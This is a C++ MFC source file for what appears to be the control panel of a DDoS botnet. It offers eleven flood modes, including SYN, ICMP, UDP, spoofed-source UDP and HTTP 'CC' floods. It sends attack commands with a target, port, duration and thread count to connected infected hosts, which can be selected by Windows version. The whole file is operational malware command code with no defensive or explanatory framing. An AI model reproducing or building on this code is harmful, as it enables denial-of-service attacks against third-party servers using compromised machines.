// DDOS.cpp : implementation file
//

#include "stdafx.h"
#include "MainFrm.h"
#include "ClientView.h"
#include "Client.h"
#include "DDOS.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif


extern CClientView* g_pConnectView;
extern CMainFrame* g_pFrame;
int bao=1;
int bao1=1;

/////////////////////////////////////////////////////////////////////////////
// CDDOS

IMPLEMENT_DYNCREATE(CDDOS, CFormView)

CDDOS::CDDOS()
	: CFormView(CDDOS::IDD)
{
	//{{AFX_DATA_INIT(CDDOS)
	m_auto = FALSE;
	m_addr = _T("");
	m_port = _T("80");
	m_thread = _T("10");
	m_time = _T("10");
	m_time1 = _T("10");
	m_thread1 = _T("10");
	m_port1 = _T("80");
	m_addr1 = _T("");
	isupdatedata = true;
	isupdatedata1 = true;
	//}}AFX_DATA_INIT
}

CDDOS::~CDDOS()
{
}

void CDDOS::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDDOS)
	DDX_Control(pDX, IDC_BUTTON_STOP1, m_Stop1);
	DDX_Control(pDX, IDC_BUTTON_BEGIN1, m_Start1);
	DDX_Control(pDX, IDC_BUTTON_STOP, m_Stop);
	DDX_Control(pDX, IDC_BUTTON_BEGIN, m_Start);
	DDX_Control(pDX, IDC_COMBO_MS1, m_ms1);
	DDX_Control(pDX, IDC_LIST1, m_atklist);
	DDX_Control(pDX, IDC_COMBO_MS, m_ms);
	DDX_Check(pDX, IDC_CHECK_AUTO, m_auto);
	DDX_Text(pDX, IDC_EDIT_ADDR, m_addr);
	DDX_Text(pDX, IDC_EDIT_PORT, m_port);
	DDX_Text(pDX, IDC_EDIT_THREAD, m_thread);
	DDX_Text(pDX, IDC_EDIT_TIME, m_time);
	DDX_Text(pDX, IDC_EDIT_TIME1, m_time1);
	DDX_Text(pDX, IDC_EDIT_THREAD1, m_thread1);
	DDX_Text(pDX, IDC_EDIT_PORT1, m_port1);
	DDX_Text(pDX, IDC_EDIT_ADDR1, m_addr1);
	DDX_Control(pDX, IDC_BUTTON_ADD, m_Add);
	DDX_Control(pDX, IDC_BUTTON_DEL, m_Delete);
	DDX_Control(pDX, IDC_BUTTON1, m_Button1);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CDDOS, CFormView)
	//{{AFX_MSG_MAP(CDDOS)
	ON_CBN_SELCHANGE(IDC_COMBO_MS, OnSelchangeComboMs)
	ON_BN_CLICKED(IDC_BUTTON_BEGIN, OnButtonBegin)
	ON_BN_CLICKED(IDC_BUTTON_STOP, OnButtonStop)
	ON_BN_CLICKED(IDC_RADIO11, OnRadio11)
	ON_BN_CLICKED(IDC_RADIO12, OnRadio12)
	ON_BN_CLICKED(IDC_BUTTON1, OnButton1)
	ON_BN_CLICKED(IDC_RADIO13, OnRadio13)
	ON_BN_CLICKED(IDC_RADIO14, OnRadio14)
	ON_BN_CLICKED(IDC_RADIO15, OnRadio15)
	ON_BN_CLICKED(IDC_BUTTON_ADD, OnButtonAdd)
	ON_BN_CLICKED(IDC_BUTTON_DEL, OnButtonDel)
	ON_CBN_SELCHANGE(IDC_COMBO_MS1, OnSelchangeComboMs1)
	ON_BN_CLICKED(IDC_BUTTON_BEGIN1, OnButtonBegin1)
	ON_BN_CLICKED(IDC_BUTTON_STOP1, OnButtonStop1)
	ON_BN_CLICKED(IDC_RADIO16, OnRadio16)
	ON_BN_CLICKED(IDC_RADIO17, OnRadio17)
	ON_BN_CLICKED(IDC_RADIO18, OnRadio18)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDDOS diagnostics

#ifdef _DEBUG
void CDDOS::AssertValid() const
{
	CFormView::AssertValid();
}

void CDDOS::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CDDOS message handlers


void CDDOS::OnSelchangeComboMs() 
{
	// TODO: Add your control notification handler code here
	CString hua;

	m_ms.GetLBText(m_ms.GetCurSel(),hua); 
	
	if (hua=="[1]SYN Flood")
	{
		bao=1;
	}
	else if (hua=="[2]ICMP Flood")
	{
		bao=2;
	}
	else if (hua=="[3]UDP Flood")
	{
		bao=3;
	}
	else if (hua=="[4]UDP 碎片")
	{
		bao=4;
	}
	else if (hua=="[5]伪造源UDP")
	{
		bao=5;
	}
	else if (hua=="[6]TCP Flood")
	{
		bao=6;
	}
	else if (hua=="[7]TCP 多连接")
	{
		bao=7;
	}
	else if (hua=="[8]标准CC")
	{
		bao=8;
	}
	else if (hua=="[9]变异CC")
	{
		bao=9;
	}
	else if (hua=="[10]无缓冲GET洪水")
	{
		bao=10;
	}
	else if (hua=="[11]HTTP空GET请求")
	{
		bao=11;
	}
}

CString hua1;
void CDDOS::OnSelchangeComboMs1() 
{

	// TODO: Add your control notification handler code here
	m_ms1.GetLBText(m_ms1.GetCurSel(),hua1); 
	
	if (hua1=="[1]SYN Flood")
	{
		bao1=1;
	}
	else if (hua1=="[2]ICMP Flood")
	{
		bao1=2;
	}
	else if (hua1=="[3]UDP Flood")
	{
		bao1=3;
	}
	else if (hua1=="[4]UDP 碎片")
	{
		bao1=4;
	}
	else if (hua1=="[5]伪造源UDP")
	{
		bao1=5;
	}
	else if (hua1=="[6]TCP Flood")
	{
		bao1=6;
	}
	else if (hua1=="[7]TCP 多连接")
	{
		bao1=7;
	}
	else if (hua1=="[8]标准CC")
	{
		bao1=8;
	}
	else if (hua1=="[9]变异CC")
	{
		bao1=9;
	}
	else if (hua1=="[10]无缓冲GET洪水")
	{
		bao1=10;
	}
	else if (hua1=="[11]HTTP空GET请求")
	{
		bao1=11;
	}
	
}


void CDDOS::OnActivateView(BOOL bActivate, CView* pActivateView, CView* pDeactiveView) 
{

//	m_Button1.SubclassDlgItem(IDC_BUTTON1,this);
//	m_Button1.SetIcon(IDI_AUDIO);
//	m_Button1.SetFlat(FALSE);

// 	short	shBtnColor = 30;
// 
// 	m_Button1.SetIcon(IDI_Checkmark);
// 	m_Button1.OffsetColor(CButtonST::BTNST_COLOR_BK_IN, shBtnColor);
// //	m_Button1.SetRounded(TRUE);
// //XP风格，显示四周的轮廓
// 	m_Delete.SetIcon(IDI_Delete);
// 	m_Add.SetIcon(IDI_Add);
// 	m_Start.SetIcon(IDI_Start);
// 	m_Start1.SetIcon(IDI_Start);
// 	m_Stop.SetIcon(IDI_stop);
// 	m_Stop1.SetIcon(IDI_stop);
// 	m_Button1.OffsetColor(CButtonST::BTNST_COLOR_BK_IN, shBtnColor);
// 	m_Button1.SetTooltipText(_T("Close the application"));


	if (isupdatedata1==true)
	{
		UpdateData(false);
		m_ms1.AddString("[1]SYN Flood");
		m_ms1.AddString("[2]ICMP Flood");
		m_ms1.AddString("[3]UDP Flood");
		m_ms1.AddString("[4]UDP 碎片");
		m_ms1.AddString("[5]伪造源UDP");
		m_ms1.AddString("[6]TCP Flood");
		m_ms1.AddString("[7]TCP 多连接");
		m_ms1.AddString("[8]标准CC");
		m_ms1.AddString("[9]变异CC");
		m_ms1.AddString("[10]无缓冲GET洪水");
		m_ms1.AddString("[11]HTTP空GET请求");
		m_ms1.SetCurSel(0);
		
		ListView_SetExtendedListViewStyle(m_atklist.m_hWnd,LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);
		m_atklist.InsertColumn(0, "攻击目标",LVCFMT_LEFT,200);
		m_atklist.InsertColumn(1, "端口",LVCFMT_LEFT,42);
		m_atklist.InsertColumn(2, "时间",LVCFMT_LEFT,42);
		m_atklist.InsertColumn(3, "线程",LVCFMT_LEFT,42);
		m_atklist.InsertColumn(4, "模式",LVCFMT_LEFT,42);
		m_atklist.InsertColumn(5, "状态",LVCFMT_LEFT,40);
		isupdatedata1=false;
	}

	// TODO: Add your specialized code here and/or call the base class
if (isupdatedata==true)
{
	UpdateData(false);
	m_ms.AddString("[1]SYN Flood");
	m_ms.AddString("[2]ICMP Flood");
	m_ms.AddString("[3]UDP Flood");
	m_ms.AddString("[4]UDP 碎片");
	m_ms.AddString("[5]伪造源UDP");
	m_ms.AddString("[6]TCP Flood");
	m_ms.AddString("[7]TCP 多连接");
	m_ms.AddString("[8]标准CC");
	m_ms.AddString("[9]变异CC");
	m_ms.AddString("[10]无缓冲GET洪水");
	m_ms.AddString("[11]HTTP空GET请求");
	m_ms.SetCurSel(0);

	isupdatedata=false;

}
	
//	CFormView::OnActivateView(bActivate, pActivateView, pDeactiveView);
}
void CDDOS::OnButtonAdd() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CString temp;
	temp.Format("%d",bao1);
	int n=m_atklist.GetItemCount();
	m_atklist.InsertItem(n,m_addr1);
	m_atklist.SetItemText(n,1,m_port1);
	m_atklist.SetItemText(n,2,m_time1);
	m_atklist.SetItemText(n,3,m_thread1);
	m_atklist.SetItemText(n,4,temp);
	m_atklist.SetItemText(n,5,"待命");
}

void CDDOS::OnButtonDel() 
{
	// TODO: Add your control notification handler code here
	// TODO: Add your control notification handler code here
	POSITION pos;
	pos = m_atklist.GetFirstSelectedItemPosition();
	if (pos == NULL)
	{
		MessageBox("请选择一个目标   ","提示", MB_OK|MB_ICONWARNING);
		return;
	}
	int check = m_atklist.GetNextSelectedItem(pos);
	m_atklist.DeleteItem(check);
}

void CDDOS::OnButtonBegin() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	GetDlgItem(IDC_BUTTON_BEGIN)->EnableWindow(0);
	GetDlgItem(IDC_BUTTON_STOP)->EnableWindow(1);


	IMESSAGE *go=new IMESSAGE;
	IMESSAGE go1;
	go->msg_id=COMMAND_DDOS;

	memset(go->addr,0,sizeof(go1.addr));
	strcpy(go->addr,m_addr);
	
	go->port=atoi(m_port);
	
	go->time=atoi(m_time);
	
	go->thread=atoi(m_thread);
	
	go->pt=bao;
	
	g_pConnectView->Attack( (BYTE*)go, sizeof(IMESSAGE));

// 	int n=pList->GetItemCount();
// 	for(int i=0;i<n;i++)
// 	{
// 		if (pList->GetCheck(i))
// 		{
// 			SOCKET SerSock = pList->GetItemData(i);
// 			m_ddosiocp->SendMsg(SerSock,(char *)&go,sizeof(go));
// 			pList->SetItemText(i,1,"活动");
// 		}
// 	}	
// 	n=pMsg->GetItemCount();
// 	CTime time=CTime::GetCurrentTime();	
// 	CString m_strTime=time.Format("%Y年%m月%d日 %H:%M:%S");
// 	n=pMsg->GetItemCount();
// 	pMsg->InsertItem(n,m_strTime);
// 	pMsg->SetItemText(n,1,"被选主机已经进入攻击状态");
}

void CDDOS::OnButtonStop() 
{
	// TODO: Add your control notification handler code here
	GetDlgItem(IDC_BUTTON_BEGIN)->EnableWindow(1);
	GetDlgItem(IDC_BUTTON_STOP)->EnableWindow(0);
	
	IMESSAGE *go= new IMESSAGE;
	go->msg_id=DDOS_STOP;
	
	go->thread=atoi(m_thread);

	g_pConnectView->StopAttack( (BYTE*)go, sizeof(IMESSAGE));


// 	int n=pList->GetItemCount();
// 	for(int i=0;i<n;i++)
// 	{
// 		if (pList->GetCheck(i))
// 		{
// 			SOCKET SerSock = pList->GetItemData(i);
// 			m_ddosiocp->SendMsg(SerSock,(char *)&go,sizeof(go));
// 			pList->SetItemText(i,1,"待命");
// 		}
// 	}
// 	n=pMsg->GetItemCount();
// 	CTime time=CTime::GetCurrentTime();	
// 	CString m_strTime=time.Format("%Y年%m月%d日 %H:%M:%S");
// 	n=pMsg->GetItemCount();
// 	pMsg->InsertItem(n,m_strTime);
// 	pMsg->SetItemText(n,1,"被选主机已经停止攻击");
}

void CDDOS::OnRadio11() 
{
	if ( g_pConnectView == NULL ) 
	{
		//AfxMessageBox("尚未初始化,请等待主机上线");
		MessageBox("尚未初始化,请等待主机上线","提示", MB_OK|MB_ICONWARNING);
		return;
	}
	
	// TODO: Add your control notification handler code here
	for (int i = 0; i < g_pConnectView->m_pListCtrl->GetItemCount(); i++)   
	{   
		g_pConnectView->m_pListCtrl->SetCheck(i,TRUE);

	}

}

void CDDOS::OnRadio12() 
{
	if ( g_pConnectView == NULL ) 
	{
	//	AfxMessageBox("尚未初始化,请等待主机上线");
		MessageBox("尚未初始化,请等待主机上线","提示", MB_OK|MB_ICONWARNING);
		return;
	}
	
	// TODO: Add your control notification handler code here
	for (int i = 0; i < g_pConnectView->m_pListCtrl->GetItemCount(); i++)   
	{   
		g_pConnectView->m_pListCtrl->SetCheck(i,FALSE);
	}	
}

void CDDOS::OnButton1() 
{
	if ( g_pConnectView == NULL ) 
	{
//		AfxMessageBox("尚未初始化,请等待主机上线");
		MessageBox("尚未初始化,请等待主机上线","提示", MB_OK|MB_ICONWARNING);
		return;
	}

	// TODO: Add your control notification handler code here
	CString Server;
	GetDlgItem(IDC_EDIT5)->GetWindowText(Server);   //
	if(Server<="0")
    MessageBox("请输入机器数","提示");
	else
	{
		for (int i = 0; i < g_pConnectView->m_pListCtrl->GetItemCount(); i++)   
		{ 
			for(int a=0;a<atoi(LPCTSTR(Server));a++)
			{
		    g_pConnectView->m_pListCtrl->SetCheck(a,TRUE);
			}
	}	
	}
}

void CDDOS::OnRadio13() 
{
	if ( g_pConnectView == NULL ) 
	{
//		AfxMessageBox("尚未初始化,请等待主机上线");
		MessageBox("尚未初始化,请等待主机上线","提示", MB_OK|MB_ICONWARNING);
		return;
	}
	
	// TODO: Add your control notification handler code here
	for (int i = 0; i < g_pConnectView->m_pListCtrl->GetItemCount(); i++)   
	{   
		if ( ( g_pConnectView->m_pListCtrl->GetItemText( i, 5 ).Find( "XP" ) ) != -1 )
		{
		g_pConnectView->m_pListCtrl->SetCheck(i,TRUE);
		}
	}
}

void CDDOS::OnRadio14() 
{
	if ( g_pConnectView == NULL ) 
	{
		//AfxMessageBox("尚未初始化,请等待主机上线");
		MessageBox("尚未初始化,请等待主机上线","提示", MB_OK|MB_ICONWARNING);
		return;
	}
	
	// TODO: Add your control notification handler code here
	for (int i = 0; i < g_pConnectView->m_pListCtrl->GetItemCount(); i++)   
	{   
		if ( ( g_pConnectView->m_pListCtrl->GetItemText( i, 5 ).Find( "2003" ) ) != -1 )
		{
		     g_pConnectView->m_pListCtrl->SetCheck(i,TRUE);
		}
	}
}

void CDDOS::OnRadio15() 
{
	if ( g_pConnectView == NULL ) 
	{
		//AfxMessageBox("尚未初始化,请等待主机上线");
		MessageBox("尚未初始化,请等待主机上线","提示", MB_OK|MB_ICONWARNING);
		return;
	}
	
	// TODO: Add your control notification handler code here
	for (int i = 0; i < g_pConnectView->m_pListCtrl->GetItemCount(); i++)   
	{   
		if ( ( g_pConnectView->m_pListCtrl->GetItemText( i, 5 ).Find( "Vista" ) ) != -1 )
		{
		g_pConnectView->m_pListCtrl->SetCheck(i,TRUE);
		}
	}
}



void CDDOS::OnButtonBegin1() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	POSITION pos;
	pos = m_atklist.GetFirstSelectedItemPosition();
	if (pos == NULL)
	{
		MessageBox("请选择一个目标   ","错误", MB_OK|MB_ICONWARNING);
		return;
	}
	int check = m_atklist.GetNextSelectedItem(pos);
	
	IMESSAGE *go=new IMESSAGE;
	IMESSAGE go1;
	go->msg_id=COMMAND_DDOS;
	
	memset(go->addr,0,sizeof(go1.addr));
	strcpy(go->addr,m_atklist.GetItemText(check,0));
	
	go->port=atoi(m_atklist.GetItemText(check,1));
	
	go->time=atoi(m_atklist.GetItemText(check,2));
	
	go->thread=atoi(m_atklist.GetItemText(check,3));
	
	go->pt=atoi(m_atklist.GetItemText(check,4));
	

	m_atklist.SetItemText(check,5,"攻击");

	g_pConnectView->Attack( (BYTE*)go, sizeof(IMESSAGE));
}

void CDDOS::OnButtonStop1() 
{
	// TODO: Add your control notification handler code here
	IMESSAGE *go= new IMESSAGE;
	go->msg_id=DDOS_STOP;
	
	POSITION pos;
	pos = m_atklist.GetFirstSelectedItemPosition();
	if (pos == NULL)
	{
		MessageBox("请选择一个目标   ","错误", MB_OK|MB_ICONWARNING);
		return;
	}
	int check = m_atklist.GetNextSelectedItem(pos);
	
	go->thread=atoi(m_atklist.GetItemText(check,3));
	
	m_atklist.SetItemText(check,5,"待命");

	g_pConnectView->StopAttack( (BYTE*)go, sizeof(IMESSAGE));
}


void CDDOS::OnRadio16() 
{
	// TODO: Add your control notification handler code here
	if ( g_pConnectView == NULL ) 
	{
		//AfxMessageBox("尚未初始化,请等待主机上线");
		MessageBox("尚未初始化,请等待主机上线","提示", MB_OK|MB_ICONWARNING);
		return;
	}
	for (int i = 0; i < g_pConnectView->m_pListCtrl->GetItemCount(); i++)   
	{   
		if(g_pConnectView->m_pListCtrl->GetCheck(i))
		{
			g_pConnectView->m_pListCtrl->SetCheck(i,FALSE);
		}
		else
		{
			g_pConnectView->m_pListCtrl->SetCheck(i,TRUE);
		}
	}
	
}

void CDDOS::OnRadio17() 
{
	// TODO: Add your control notification handler code here
	if ( g_pConnectView == NULL ) 
	{
	//	AfxMessageBox("尚未初始化,请等待主机上线");
		MessageBox("尚未初始化,请等待主机上线","提示", MB_OK|MB_ICONWARNING);
		return;
	}
	
	// TODO: Add your control notification handler code here
	for (int i = 0; i < g_pConnectView->m_pListCtrl->GetItemCount(); i++)   
	{   
		if ( ( g_pConnectView->m_pListCtrl->GetItemText( i, 5 ).Find( "2008" ) ) != -1 )
		{
			g_pConnectView->m_pListCtrl->SetCheck(i,TRUE);
		}
	}
}
void CDDOS::OnRadio18() 
{
	// TODO: Add your control notification handler code here
	if ( g_pConnectView == NULL ) 
	{
		//AfxMessageBox("尚未初始化,请等待主机上线");
		MessageBox("尚未初始化,请等待主机上线","提示", MB_OK|MB_ICONWARNING);
		return;
	}
	
	// TODO: Add your control notification handler code here
	for (int i = 0; i < g_pConnectView->m_pListCtrl->GetItemCount(); i++)   
	{   
		if ( ( g_pConnectView->m_pListCtrl->GetItemText( i, 5 ).Find( "Win 7" ) ) != -1 )
		{
			g_pConnectView->m_pListCtrl->SetCheck(i,TRUE);
		}
	}
}
